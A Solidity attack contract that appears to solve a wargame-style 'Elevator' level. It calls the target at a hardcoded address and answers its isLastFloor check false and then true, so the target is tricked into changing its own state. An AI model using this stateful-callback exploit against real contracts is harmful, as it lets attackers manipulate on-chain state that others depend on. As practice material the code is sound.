// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./contract.sol";

contract BuildingHack {
    Elevator original = Elevator(0x347d04A3fe701846DFE652453848C191339AF1fe);
    uint256 public realTop = 2;
    bool public flag = false;

    function callGoTo() public {
        original.goTo(2);
    }

    function isLastFloor(uint256 floor) external returns (bool) {
        if (floor < realTop) {
            return false;
        } else {
            if (flag == false) {
                flag = true;
                return false;
            } else {
                flag = false;
                return true;
            }
        }
    }
}
